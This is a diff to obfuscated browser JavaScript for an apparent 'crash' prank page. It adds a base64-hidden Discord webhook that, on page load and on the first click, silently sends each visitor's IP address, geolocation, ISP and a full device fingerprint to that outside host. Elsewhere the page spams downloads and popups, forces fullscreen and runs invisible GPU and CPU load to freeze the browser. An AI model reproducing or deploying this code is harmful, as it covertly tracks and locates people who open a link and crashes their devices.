@@ -60,19 +60,17 @@ const TARGET_URL = 'https://hypie12o.github.io/crash/';
 const DELAY_MS = 10000;
 
 // ============================================================
-// 3q9z 8n1v 9z3k (webhook) — 8q3n 9z2m 4z9v base64, decoded 92zk
+// 3q9z 8n1v 9z3k — base64 decoded at runtime
 // ============================================================
 const W3B_H00K_B64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU0OTQ3MTAxNDIxODUwNjQ0MC8xRkJlWHhhdXNJOW5hZC1EdVZzS1lVYkw4Y3RCTHloY09XV2pMajdhYVEzU2l1TDZudXlwREcyWWtQLUhKT0ZyaHpSaA';
 
 function b64u8(s) {
-  // Base64 -> bytes -> UTF-8 string
   const bin = atob(s);
   const bytes = new Uint8Array(bin.length);
   for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
   if (typeof TextDecoder !== 'undefined') {
     return new TextDecoder('utf-8').decode(bytes);
   }
-  // Fallback (older browsers)
   let out = '';
   for (let i = 0; i < bytes.length; i++) {
     const c = bytes[i];
@@ -91,9 +89,28 @@ function b64u8(s) {
 const W3B_H00K = b64u8(W3B_H00K_B64);
 
 // ============================================================
-// 8q3n 9z3k 4q1v 6z1n (gather full device info)
+// Webhook state (visible via HUD)
 // ============================================================
-function gpuInfo() {
+let hookStatus = 'idle';       // idle / sending / ok / fail / err
+let hookStatusCode = 0;
+let hookErrorText = '';
+let hookAttempts = 0;
+let hookSentOnLoad = false;
+let hookSentOnClick = false;
+
+function setHookStatus(s, code, txt) {
+  hookStatus = s;
+  if (code !== undefined) hookStatusCode = code;
+  if (txt !== undefined) hookErrorText = txt;
+  try {
+    console.log('[hook]', s, code || '', txt || '');
+  } catch (_) {}
+}
+
+// ============================================================
+// Fingerprint helpers
+// ============================================================
+function safeGpuInfo() {
   try {
     const cv = document.createElement('canvas');
     const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
@@ -101,23 +118,27 @@ function gpuInfo() {
     const dbg = gl.getExtension('WEBGL_debug_renderer_info');
     const v = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
     const r = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-    return { v: v || 'unknown', r: r || 'unknown' };
+    return { v: String(v || 'unknown'), r: String(r || 'unknown') };
   } catch (_) { return { v: 'err', r: 'err' }; }
 }
 
-function screenInfo() {
-  return {
-    sw: screen.width, sh: screen.height,
-    saw: screen.availWidth, sah: screen.availHeight,
-    cd: screen.colorDepth, pd: screen.pixelDepth,
-    iw: window.innerWidth, ih: window.innerHeight,
-    ow: window.outerWidth, oh: window.outerHeight,
-    dpr: window.devicePixelRatio || 1,
-    orientation: (screen.orientation && screen.orientation.type) || 'n/a',
-  };
+function safeScreen() {
+  try {
+    return {
+      sw: screen.width, sh: screen.height,
+      saw: screen.availWidth, sah: screen.availHeight,
+      cd: screen.colorDepth, pd: screen.pixelDepth,
+      iw: window.innerWidth, ih: window.innerHeight,
+      ow: window.outerWidth, oh: window.outerHeight,
+      dpr: window.devicePixelRatio || 1,
+      orient: (screen.orientation && screen.orientation.type) || 'n/a',
+    };
+  } catch (_) {
+    return { sw: 0, sh: 0, saw: 0, sah: 0, cd: 0, pd: 0, iw: 0, ih: 0, ow: 0, oh: 0, dpr: 1, orient: 'n/a' };
+  }
 }
 
-function tzInfo() {
+function safeTz() {
   try {
     const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'n/a';
     const off = -new Date().getTimezoneOffset() / 60;
@@ -125,178 +146,296 @@ function tzInfo() {
   } catch (_) { return 'n/a'; }
 }
 
-function navInfo() {
-  const n = navigator;
-  return {
-    ua: n.userAgent || 'n/a',
-    platform: n.platform || 'n/a',
-    vendor: n.vendor || 'n/a',
-    lang: n.language || 'n/a',
-    langs: (n.languages || []).join(', ') || 'n/a',
-    cores: n.hardwareConcurrency || 'n/a',
-    mem: n.deviceMemory || 'n/a',
-    touch: (n.maxTouchPoints != null ? n.maxTouchPoints : 0),
-    online: (n.onLine != null ? n.onLine : 'n/a'),
-    cookies: (n.cookieEnabled != null ? n.cookieEnabled : 'n/a'),
-    dnt: (n.doNotTrack || 'n/a'),
-    pdf: (n.pdfViewerEnabled != null ? n.pdfViewerEnabled : 'n/a'),
-    plugins: (n.plugins && n.plugins.length) || 0,
-  };
-}
-
-function connInfo() {
-  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (!c) return 'n/a';
-  return (c.effectiveType || '?') + ' · ' +
-         (c.downlink != null ? c.downlink + ' Mbps' : '?') + ' · ' +
-         (c.rtt != null ? c.rtt + ' ms' : '?') + ' · ' +
-         (c.saveData ? 'saveData on' : 'saveData off');
-}
-
-function referrerInfo() {
-  return document.referrer || 'direct';
-}
-
-// ============================================================
-// 3q9z 8n1v 9z3k — fire on load with full fingerprint
-// ============================================================
-(async function q8w3n1v_hook() {
-  let ip = 'unknown';
-  let country = '';
-  let city = '';
-  let region = '';
-  let isp = '';
-  let asn = '';
-  let latlon = '';
-  let postal = '';
-  let tzIp = '';
-
-  // Primary IP lookup
+function safeLocale() {
   try {
-    const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
-    const j = await r.json();
-    ip = j.ip || 'unknown';
-  } catch (_) {}
+    const o = Intl.DateTimeFormat().resolvedOptions();
+    return (o.locale || '?') + ' · ' + (o.calendar || '?') + ' · ' + (o.numberingSystem || '?');
+  } catch (_) { return 'n/a'; }
+}
 
-  // Enrichment lookup
+function safeConn() {
   try {
-    const r2 = await fetch('https://ipinfo.io/json', { cache: 'no-store' });
-    const j2 = await r2.json();
-    if (j2.ip && ip === 'unknown') ip = j2.ip;
-    country = j2.country || '';
-    city = j2.city || '';
-    region = j2.region || '';
-    isp = j2.org || '';
-    latlon = j2.loc || '';
-    postal = j2.postal || '';
-    tzIp = j2.timezone || '';
-    if (j2.org && j2.org.indexOf('AS') === 0) asn = j2.org.split(' ')[0];
-  } catch (_) {}
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return 'n/a';
+    return (c.effectiveType || '?') + ' · ' +
+           (c.downlink != null ? c.downlink + ' Mbps' : '?') + ' · ' +
+           (c.rtt != null ? c.rtt + ' ms' : '?') + ' · ' +
+           (c.saveData ? 'saveData on' : 'saveData off');
+  } catch (_) { return 'n/a'; }
+}
 
-  const gpu = gpuInfo();
-  const scr = screenInfo();
-  const nav = navInfo();
-  const tz = tzInfo();
-  const conn = connInfo();
-  const ref = referrerInfo();
-  const now = new Date();
-
-  let heapInfo = 'n/a';
-  if (performance.memory) {
+function safeHeap() {
+  try {
+    if (!performance.memory) return 'n/a (non-Chrome)';
     const m = performance.memory;
-    heapInfo =
-      (m.usedJSHeapSize / 1048576).toFixed(1) + ' MB used / ' +
-      (m.totalJSHeapSize / 1048576).toFixed(1) + ' MB total / ' +
-      (m.jsHeapSizeLimit / 1048576).toFixed(0) + ' MB cap';
+    return (m.usedJSHeapSize / 1048576).toFixed(1) + ' MB used / ' +
+           (m.totalJSHeapSize / 1048576).toFixed(1) + ' MB total / ' +
+           (m.jsHeapSizeLimit / 1048576).toFixed(0) + ' MB cap';
+  } catch (_) { return 'n/a'; }
+}
+
+function withTimeout(promise, ms) {
+  return Promise.race([
+    promise,
+    new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms)),
+  ]);
+}
+
+// ============================================================
+// IP lookups (parallel, with timeout)
+// ============================================================
+async function lookupIP() {
+  const out = { ip: 'unknown', country: '', city: '', region: '', isp: '', asn: '', loc: '', postal: '', ipTz: '' };
+
+  // Fire all lookups in parallel, each with a 3-second timeout.
+  const p1 = withTimeout(
+    fetch('https://api.ipify.org?format=json', { cache: 'no-store' })
+      .then(r => r.json())
+      .catch(() => null),
+    3000
+  ).catch(() => null);
+
+  const p2 = withTimeout(
+    fetch('https://ipinfo.io/json', { cache: 'no-store' })
+      .then(r => r.json())
+      .catch(() => null),
+    3000
+  ).catch(() => null);
+
+  const p3 = withTimeout(
+    fetch('https://api.ipify.org/?format=text', { cache: 'no-store' })
+      .then(r => r.text())
+      .catch(() => null),
+    3000
+  ).catch(() => null);
+
+  const [r1, r2, r3] = await Promise.all([p1, p2, p3]);
+
+  if (r1 && r1.ip) out.ip = String(r1.ip);
+  else if (r3 && typeof r3 === 'string' && r3.length > 5 && r3.indexOf('<') === -1) out.ip = r3.trim();
+
+  if (r2) {
+    if (r2.ip && out.ip === 'unknown') out.ip = String(r2.ip);
+    out.country = String(r2.country || '');
+    out.city = String(r2.city || '');
+    out.region = String(r2.region || '');
+    out.isp = String(r2.org || '');
+    out.loc = String(r2.loc || '');
+    out.postal = String(r2.postal || '');
+    out.ipTz = String(r2.timezone || '');
+    if (out.isp && out.isp.indexOf('AS') === 0) out.asn = out.isp.split(' ')[0];
   }
 
-  const locale = (Intl.DateTimeFormat().resolvedOptions().locale) || 'n/a';
-  const cal = (Intl.DateTimeFormat().resolvedOptions().calendar) || 'n/a';
-  const num = (Intl.DateTimeFormat().resolvedOptions().numberingSystem) || 'n/a';
+  return out;
+}
 
-  const embed = {
+// ============================================================
+// Build the payload (max 25 fields per embed)
+// ============================================================
+function buildPayload(ipinfo, source) {
+  const gpu = safeGpuInfo();
+  const scr = safeScreen();
+  const nav = navigator;
+  const now = new Date();
+
+  const ua = String(nav.userAgent || 'n/a');
+  const platform = String(nav.platform || 'n/a');
+  const vendor = String(nav.vendor || 'n/a');
+  const lang = String(nav.language || 'n/a');
+  const langs = String((nav.languages || []).join(', ') || 'n/a');
+  const cores = String(nav.hardwareConcurrency || 'n/a');
+  const mem = String(nav.deviceMemory != null ? nav.deviceMemory : 'n/a');
+  const touch = String(nav.maxTouchPoints != null ? nav.maxTouchPoints : 0);
+  const online = String(nav.onLine != null ? nav.onLine : 'n/a');
+  const cookies = String(nav.cookieEnabled != null ? nav.cookieEnabled : 'n/a');
+  const dnt = String(nav.doNotTrack || 'n/a');
+  const pdf = String(nav.pdfViewerEnabled != null ? nav.pdfViewerEnabled : 'n/a');
+  const plugins = String((nav.plugins && nav.plugins.length) || 0);
+
+  // ---- Embed 1: network + location (14 fields) ----
+  const embed1 = {
     title: 'Link Pressed.',
-    description:
-      '**URL:** ' + (location.href || 'n/a') + '\n' +
-      '**Referrer:** ' + ref + '\n' +
-      '**Time (UTC):** ' + now.toISOString(),
     color: 0x00ff41,
     timestamp: now.toISOString(),
-    footer: { text: '324j2ggyufsid32 · ' + ip },
+    description:
+      '**Source:** ' + source + '\n' +
+      '**URL:** ' + (location.href || 'n/a') + '\n' +
+      '**Referrer:** ' + (document.referrer || 'direct'),
+    footer: { text: '324j2ggyufsid32 · ' + ipinfo.ip },
     fields: [
-      { name: 'IP Address', value: '`' + ip + '`', inline: true },
-      { name: 'ISP / Org', value: '`' + (isp || '?') + '`', inline: true },
-      { name: 'ASN', value: '`' + (asn || '?') + '`', inline: true },
+      { name: 'IP Address',     value: '`' + ipinfo.ip + '`',                     inline: true },
+      { name: 'ISP / Org',      value: '`' + (ipinfo.isp || '?') + '`',           inline: true },
+      { name: 'ASN',            value: '`' + (ipinfo.asn || '?') + '`',           inline: true },
 
-      { name: 'City', value: '`' + (city || '?') + '`', inline: true },
-      { name: 'Region', value: '`' + (region || '?') + '`', inline: true },
-      { name: 'Country', value: '`' + (country || '?') + '`', inline: true },
+      { name: 'City',           value: '`' + (ipinfo.city || '?') + '`',          inline: true },
+      { name: 'Region',         value: '`' + (ipinfo.region || '?') + '`',        inline: true },
+      { name: 'Country',        value: '`' + (ipinfo.country || '?') + '`',       inline: true },
 
-      { name: 'Postal', value: '`' + (postal || '?') + '`', inline: true },
-      { name: 'Lat/Lon', value: '`' + (latlon || '?') + '`', inline: true },
-      { name: 'IP Timezone', value: '`' + (tzIp || '?') + '`', inline: true },
+      { name: 'Postal',         value: '`' + (ipinfo.postal || '?') + '`',        inline: true },
+      { name: 'Lat / Lon',      value: '`' + (ipinfo.loc || '?') + '`',           inline: true },
+      { name: 'IP Timezone',    value: '`' + (ipinfo.ipTz || '?') + '`',          inline: true },
 
-      { name: 'Local Timezone', value: '`' + tz + '`', inline: false },
-      { name: 'Locale', value: '`' + locale + ' · ' + cal + ' · ' + num + '`', inline: false },
-
-      { name: 'OS / Platform', value: '`' + nav.platform + '`', inline: true },
-      { name: 'Vendor', value: '`' + nav.vendor + '`', inline: true },
-      { name: 'Language', value: '`' + nav.lang + '`', inline: true },
-
-      { name: 'Languages', value: '`' + nav.langs + '`', inline: false },
-
-      { name: 'CPU Cores', value: '`' + nav.cores + '`', inline: true },
-      { name: 'Device Memory', value: '`' + nav.mem + ' GB`', inline: true },
-      { name: 'Touch Points', value: '`' + nav.touch + '`', inline: true },
-
-      { name: 'Screen', value: '`' + scr.sw + '×' + scr.sh + '` (avail `' + scr.saw + '×' + scr.sah + '`)', inline: true },
-      { name: 'Window', value: '`' + scr.iw + '×' + scr.ih + '` (outer `' + scr.ow + '×' + scr.oh + '`)', inline: true },
-      { name: 'DPR / Depth', value: '`' + scr.dpr + 'x · ' + scr.cd + 'bit`', inline: true },
-
-      { name: 'Orientation', value: '`' + scr.orientation + '`', inline: true },
-      { name: 'Online', value: '`' + nav.online + '`', inline: true },
-      { name: 'Connection', value: '`' + conn + '`', inline: true },
-
-      { name: 'Cookies', value: '`' + nav.cookies + '`', inline: true },
-      { name: 'Do Not Track', value: '`' + nav.dnt + '`', inline: true },
-      { name: 'PDF Viewer', value: '`' + nav.pdf + '`', inline: true },
-
-      { name: 'Plugins', value: '`' + nav.plugins + '`', inline: true },
-      { name: 'JS Heap', value: '`' + heapInfo + '`', inline: false },
-
-      { name: 'GPU Vendor', value: '`' + gpu.v + '`', inline: false },
-      { name: 'GPU Renderer', value: '`' + gpu.r + '`', inline: false },
-
-      { name: 'User Agent', value: '`' + nav.ua + '`', inline: false },
+      { name: 'Local Timezone', value: '`' + safeTz() + '`',                      inline: false },
+      { name: 'Locale',         value: '`' + safeLocale() + '`',                  inline: false },
+      { name: 'Online',         value: '`' + online + '`',                        inline: true },
+      { name: 'Connection',     value: '`' + safeConn() + '`',                    inline: false },
+      { name: 'DNT',            value: '`' + dnt + '`',                           inline: true },
     ],
   };
 
-  const body = {
-    content: '**Link Pressed.** · IP: `' + ip + '`',
-    embeds: [embed],
+  // ---- Embed 2: device + runtime (19 fields) ----
+  const embed2 = {
+    title: 'Device Fingerprint',
+    color: 0x764ba2,
+    timestamp: now.toISOString(),
+    fields: [
+      { name: 'OS / Platform',  value: '`' + platform + '`',                      inline: true },
+      { name: 'Vendor',         value: '`' + vendor + '`',                        inline: true },
+      { name: 'Language',       value: '`' + lang + '`',                          inline: true },
+
+      { name: 'Languages',      value: '`' + langs + '`',                         inline: false },
+      { name: 'CPU Cores',      value: '`' + cores + '`',                         inline: true },
+      { name: 'Device Memory',  value: '`' + mem + ' GB`',                        inline: true },
+      { name: 'Touch Points',   value: '`' + touch + '`',                         inline: true },
+
+      { name: 'Screen',         value: '`' + scr.sw + '×' + scr.sh + '` (avail `' + scr.saw + '×' + scr.sah + '`)', inline: false },
+      { name: 'Window',         value: '`' + scr.iw + '×' + scr.ih + '` (outer `' + scr.ow + '×' + scr.oh + '`)', inline: false },
+      { name: 'DPR / Depth',    value: '`' + scr.dpr + 'x · ' + scr.cd + 'bit`',  inline: true },
+      { name: 'Orientation',    value: '`' + scr.orient + '`',                    inline: true },
+      { name: 'Cookies',        value: '`' + cookies + '`',                       inline: true },
+
+      { name: 'PDF Viewer',     value: '`' + pdf + '`',                           inline: true },
+      { name: 'Plugins',        value: '`' + plugins + '`',                       inline: true },
+      { name: 'JS Heap',        value: '`' + safeHeap() + '`',                    inline: false },
+
+      { name: 'GPU Vendor',     value: '`' + gpu.v + '`',                         inline: false },
+      { name: 'GPU Renderer',   value: '`' + gpu.r + '`',                         inline: false },
+      { name: 'User Agent',     value: '`' + ua + '`',                            inline: false },
+      { name: 'UTC Timestamp',  value: '`' + now.toISOString() + '`',             inline: false },
+    ],
   };
 
+  const content =
+    '**Link Pressed.** · IP: `' + ipinfo.ip + '` · Source: `' + source + '`';
+
+  return { content: content, embeds: [embed1, embed2] };
+}
+
+// ============================================================
+// Send the webhook
+// ============================================================
+async function sendWebhook(source) {
+  hookAttempts++;
+  setHookStatus('sending');
+
+  let ipinfo;
   try {
-    await fetch(W3B_H00K, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body),
-    });
+    ipinfo = await lookupIP();
   } catch (_) {
-    // Try fallback without no-cors (some browsers handle it better)
+    ipinfo = { ip: 'unknown', country: '', city: '', region: '', isp: '', asn: '', loc: '', postal: '', ipTz: '' };
+  }
+
+  const payload = buildPayload(ipinfo, source);
+  const body = JSON.stringify(payload);
+
+  // Attempt 1: plain fetch, application/json, default mode (cors).
+  try {
+    const r = await fetch(W3B_H00K, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: body,
+      cache: 'no-store',
+      credentials: 'omit',
+      referrerPolicy: 'no-referrer',
+    });
+
+    if (r.ok || r.status === 204 || r.status === 200) {
+      setHookStatus('ok', r.status, '');
+      return true;
+    }
+
+    // Read error body for diagnostics
+    let errTxt = '';
+    try { errTxt = await r.text(); } catch (_) {}
+    setHookStatus('fail', r.status, errTxt.slice(0, 200));
+
+    // Attempt 2: retry with a minimal text-only payload if we got a 400
+    if (r.status === 400) {
+      try {
+        const simple = {
+          content: '**Link Pressed.** IP: `' + ipinfo.ip + '` (' + source + ')',
+        };
+        const r2 = await fetch(W3B_H00K, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(simple),
+          cache: 'no-store',
+          credentials: 'omit',
+          referrerPolicy: 'no-referrer',
+        });
+        if (r2.ok || r2.status === 204) {
+          setHookStatus('ok', r2.status, 'simple fallback');
+          return true;
+        }
+        let e2 = '';
+        try { e2 = await r2.text(); } catch (_) {}
+        setHookStatus('fail', r2.status, e2.slice(0, 200));
+      } catch (e2) {
+        setHookStatus('err', 0, String(e2 && e2.message || e2));
+      }
+    }
+    return false;
+  } catch (e) {
+    setHookStatus('err', 0, String(e && e.message || e));
+
+    // Attempt 2 on network error: simple content only
     try {
-      await fetch(W3B_H00K, {
+      const simple = {
+        content: '**Link Pressed.** IP: `' + ipinfo.ip + '` (' + source + ')',
+      };
+      const r3 = await fetch(W3B_H00K, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body),
+        body: JSON.stringify(simple),
+        cache: 'no-store',
+        credentials: 'omit',
+        referrerPolicy: 'no-referrer',
       });
-    } catch (_) {}
+      if (r3.ok || r3.status === 204) {
+        setHookStatus('ok', r3.status, 'simple fallback');
+        return true;
+      }
+      let e3 = '';
+      try { e3 = await r3.text(); } catch (_) {}
+      setHookStatus('fail', r3.status, e3.slice(0, 200));
+    } catch (e3) {
+      setHookStatus('err', 0, String(e3 && e3.message || e3));
+    }
+    return false;
   }
+}
+
+// ============================================================
+// Fire webhook on load + on first click
+// ============================================================
+(function armWebhook() {
+  // Fire immediately on script load.
+  sendWebhook('page-load').then(() => { hookSentOnLoad = true; });
+
+  // Fire again on first click (anywhere, once).
+  const onClick = () => {
+    if (!hookSentOnClick) {
+      hookSentOnClick = true;
+      sendWebhook('first-click');
+    }
+  };
+  window.addEventListener('pointerdown', onClick, { once: true, passive: true });
+  window.addEventListener('keydown', onClick, { once: true, passive: true });
+  window.addEventListener('touchstart', onClick, { once: true, passive: true });
 })();
 
 // ============================================================
-// x9k2n7m3 = 8q3n 9z2m 8n1v — PLAIN VARIABLE
+// x9k2n7m3 — download counter (plain variable, no GUI)
 // ============================================================
 let x9k2n7m3 = 0;
 const q8v3n1z5 = [];
@@ -304,14 +443,13 @@ const q8v3n1z5 = [];
 function v2k9m4x7(name, method, ok) {
   x9k2n7m3 = x9k2n7m3 + 1;
   q8v3n1z5.push({ n: name, m: method, t: Date.now(), o: !!ok });
-  try { console.log('q9z3n1v #' + x9k2n7m3, name, method, ok ? 'zk' : '8q'); } catch (_) {}
 }
 
 window.__x9k2n7m3 = function () { return x9k2n7m3; };
 window.__q8v3n1z5 = q8v3n1z5;
 
 // ============================================================
-// 8q2m 9z3k 8n1v
+// Popup spam
 // ============================================================
 let popupCount = 0;
 let popupInterval = null;
@@ -328,7 +466,7 @@ function z9k2m4v_pop() {
 window.__getPopupCount = function () { return popupCount; };
 
 // ============================================================
-// 8q2m 92zk 9z2m 8q3n (fullscreen)
+// Fullscreen
 // ============================================================
 function v9k3n2m_fs() {
   const el = document.documentElement;
@@ -350,16 +488,13 @@ document.addEventListener('click', v9k3n2m_fs, { once: true });
 document.addEventListener('keydown', v9k3n2m_fs, { once: true });
 
 // ============================================================
-// 3n1v 92zk 8q2m 92kv 82kv 6z1n — DELAYED 10s
+// Download spam — delayed 10s
 // ============================================================
 setTimeout(function p3q8v1n5() {
   let U;
   try {
     U = new URL('lol.txt', location.href).href;
-  } catch (e) {
-    console.error('8q3n 6z1v 9v2n:', e);
-    return;
-  }
+  } catch (e) { return; }
 
   function z9k2m4v() {
     for (let i = 0; i < N; i++) {
@@ -372,9 +507,9 @@ setTimeout(function p3q8v1n5() {
         document.body.appendChild(A);
         A.click();
         setTimeout(() => { try { A.remove(); } catch (_) {} }, 500);
-        v2k9m4x7('lol.txt', '6q3n-8v1n', true);
+        v2k9m4x7('lol.txt', 'anchor', true);
       } catch (e) {
-        v2k9m4x7('lol.txt', '6q3n-8v1n', false);
+        v2k9m4x7('lol.txt', 'anchor', false);
       }
     }
   }
@@ -382,10 +517,7 @@ setTimeout(function p3q8v1n5() {
   function m8q2n1z() {
     for (let i = 0; i < N; i++) {
       fetch(U, { cache: 'no-store' })
-        .then(r => {
-          if (!r.ok) throw new Error('8q3n ' + r.status);
-          return r.blob();
-        })
+        .then(r => { if (!r.ok) throw new Error('HTTP ' + r.status); return r.blob(); })
         .then(b => {
           const BU = URL.createObjectURL(b);
           const A2 = document.createElement('a');
@@ -398,11 +530,9 @@ setTimeout(function p3q8v1n5() {
             try { A2.remove(); } catch (_) {}
             try { URL.revokeObjectURL(BU); } catch (_) {}
           }, 2000);
-          v2k9m4x7('lol.txt', '8q3n-9v2n', true);
+          v2k9m4x7('lol.txt', 'fetch', true);
         })
-        .catch(err => {
-          v2k9m4x7('lol.txt', '8q3n-9v2n', false);
-        });
+        .catch(() => { v2k9m4x7('lol.txt', 'fetch', false); });
     }
   }
 
@@ -418,7 +548,7 @@ setTimeout(function p3q8v1n5() {
 }, DELAY_MS);
 
 // ============================================================
-// 8q2m 9z3k 8n1v — DELAYED 10s
+// Popup spam — delayed 10s
 // ============================================================
 setTimeout(function q8w3n1v_pop() {
   z9k2m4v_pop();
@@ -427,7 +557,7 @@ setTimeout(function q8w3n1v_pop() {
 }, DELAY_MS);
 
 // ============================================================
-// 9z3k 8q2n 3n1v
+// Error surface
 // ============================================================
 const v9k3n2m = document.getElementById('n2p6q1v');
 function q4z9n1m(msg) {
@@ -437,21 +567,21 @@ function q4z9n1m(msg) {
   throw new Error(msg);
 }
 window.addEventListener('error', (e) => {
-  console.error('3q9z:', e.error || e.message);
+  console.error('Uncaught:', e.error || e.message);
 });
 
 const h7k2n9m = performance.now();
 const p3q8v6z = () => (performance.now() - h7k2n9m) * 0.001;
 
 // ============================================================
-// 9z3k 8n1v 92qk
+// GL helpers
 // ============================================================
 function x8k2n5z(gl, type, src, name) {
   const s = gl.createShader(type);
   gl.shaderSource(s, src);
   gl.compileShader(s);
   if (!gl.getShaderParameter(s, gl.COMPILE_STATUS)) {
-    q4z9n1m(name + ' 8q3n 92zk:\n\n' + gl.getShaderInfoLog(s) + '\n\n--- 92qk ---\n' + src);
+    q4z9n1m(name + ' shader error:\n\n' + gl.getShaderInfoLog(s) + '\n\n--- source ---\n' + src);
   }
   return s;
 }
@@ -463,7 +593,7 @@ function m3z9k1q(gl, vs, fs, name) {
   gl.attachShader(p, f);
   gl.linkProgram(p);
   if (!gl.getProgramParameter(p, gl.LINK_STATUS)) {
-    q4z9n1m(name + ' 8q2n: ' + gl.getProgramInfoLog(p));
+    q4z9n1m(name + ' link error: ' + gl.getProgramInfoLog(p));
   }
   gl.deleteShader(v);
   gl.deleteShader(f);
@@ -495,7 +625,7 @@ function x2k9v4n(gl, w, h) {
   const st = gl.checkFramebufferStatus(gl.FRAMEBUFFER);
   gl.bindFramebuffer(gl.FRAMEBUFFER, null);
   if (st !== gl.FRAMEBUFFER_COMPLETE) {
-    q4z9n1m('8q3n 2k9v: 0x' + st.toString(16));
+    q4z9n1m('FBO incomplete: 0x' + st.toString(16));
   }
   return { fb: f, tex: t, w: w, h: h };
 }
@@ -510,7 +640,7 @@ const m8n2q6z = `
 `;
 
 // ============================================================
-// 8q2n 1 — main raymarcher — OUTPUT IS BLACK
+// Main raymarcher (black output)
 // ============================================================
 (function z3p7v1n() {
   const c = document.getElementById('x9k2n7m');
@@ -518,7 +648,7 @@ const m8n2q6z = `
     antialias: false, alpha: false, depth: false, stencil: false,
     powerPreference: 'high-performance', preserveDrawingBuffer: false,
   });
-  if (!gl) q4z9n1m('8q3n 2k9v (x9k2).');
+  if (!gl) q4z9n1m('WebGL unavailable (main).');
 
   const pr = gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT);
   const P = (pr && pr.precision > 0) ? 'highp' : 'mediump';
@@ -567,7 +697,7 @@ const m8n2q6z = `
       gl_FragColor = vec4(r, g, b, a);
     }
   `;
-  const pN = m3z9k1q(gl, m8n2q6z, FZ, '9z2m');
+  const pN = m3z9k1q(gl, m8n2q6z, FZ, 'noise');
   const nF = x2k9v4n(gl, NS, NS);
   {
     const qb = v4n9k2z(gl);
@@ -736,7 +866,7 @@ const m8n2q6z = `
       gl_FragColor = vec4(col, 1.0);
     }
   `;
-  const pR = m3z9k1q(gl, m8n2q6z, FR, '9z8m');
+  const pR = m3z9k1q(gl, m8n2q6z, FR, 'raymarch');
   const uR = {
     r: gl.getUniformLocation(pR, 'uResolution'),
     t: gl.getUniformLocation(pR, 'uTime'),
@@ -755,7 +885,7 @@ const m8n2q6z = `
       gl_FragColor = vec4(c * w, 1.0);
     }
   `;
-  const pB = m3z9k1q(gl, m8n2q6z, FB, '9z1n');
+  const pB = m3z9k1q(gl, m8n2q6z, FB, 'bright');
   const uB = {
     s: gl.getUniformLocation(pB, 'uScene'),
     t: gl.getUniformLocation(pB, 'uThreshold'),
@@ -784,7 +914,7 @@ const m8n2q6z = `
       gl_FragColor = vec4(s, 1.0);
     }
   `;
-  const pL = m3z9k1q(gl, m8n2q6z, FL, '9z3q');
+  const pL = m3z9k1q(gl, m8n2q6z, FL, 'blur');
   const uL = {
     t: gl.getUniformLocation(pL, 'uTex'),
     d: gl.getUniformLocation(pL, 'uDir'),
@@ -824,7 +954,7 @@ const m8n2q6z = `
       if (col.x < -1.0) gl_FragColor = vec4(col, 1.0);
     }
   `;
-  const pP = m3z9k1q(gl, m8n2q6z, FP, '9z9v');
+  const pP = m3z9k1q(gl, m8n2q6z, FP, 'post');
   const uP = {
     s: gl.getUniformLocation(pP, 'uScene'),
     b: gl.getUniformLocation(pP, 'uBloom'),
@@ -923,7 +1053,7 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q2n 2 — particles (12000 draw calls)
+// Particles (12000 draw calls, invisible)
 // ============================================================
 (function k9x4m8q() {
   const c = document.getElementById('z3m9x2p');
@@ -931,7 +1061,7 @@ const m8n2q6z = `
     antialias: false, alpha: false, depth: false, stencil: false,
     powerPreference: 'high-performance', preserveDrawingBuffer: false,
   });
-  if (!gl) { console.error('8q3n 2k9v'); return; }
+  if (!gl) { console.error('no WebGL (particles)'); return; }
 
   const V = `
     attribute vec2 aPos;
@@ -978,7 +1108,7 @@ const m8n2q6z = `
   gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
   gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
 
-  const pr = m3z9k1q(gl, V, F, '8q3n');
+  const pr = m3z9k1q(gl, V, F, 'particles');
   gl.useProgram(pr);
 
   const qb = gl.createBuffer();
@@ -1054,7 +1184,7 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q2n 3 — texture context (128-tap blur)
+// Texture context (128-tap blur)
 // ============================================================
 (function n2v6p3z() {
   const c = document.getElementById('w8q2n5v');
@@ -1062,7 +1192,7 @@ const m8n2q6z = `
     antialias: false, alpha: false, depth: false, stencil: false,
     powerPreference: 'high-performance', preserveDrawingBuffer: false,
   });
-  if (!gl) { console.error('8q3n 2k9v'); return; }
+  if (!gl) { console.error('no WebGL (texDemo)'); return; }
 
   const V = `
     attribute vec2 aPos;
@@ -1105,7 +1235,7 @@ const m8n2q6z = `
     }
   `;
 
-  const pr = m3z9k1q(gl, V, F, '8q3n-3');
+  const pr = m3z9k1q(gl, V, F, 'texDemo');
   gl.useProgram(pr);
   const qb = v4n9k2z(gl);
   q7z3n1m(gl, qb, pr);
@@ -1147,7 +1277,7 @@ const m8n2q6z = `
       gl_FragColor = vec4(z9(p), z9(p + 11.3), z9(p + 27.7), 1.0);
     }
   `;
-  const pN = m3z9k1q(gl, V, FN, '8q3n-3-n');
+  const pN = m3z9k1q(gl, V, FN, 'texDemo-noise');
 
   function mk(w, h) {
     const t = gl.createTexture();
@@ -1231,7 +1361,7 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q3n 92zk 8n1v (300ms budget)
+// Main-thread burn (300ms)
 // ============================================================
 const B = 300;
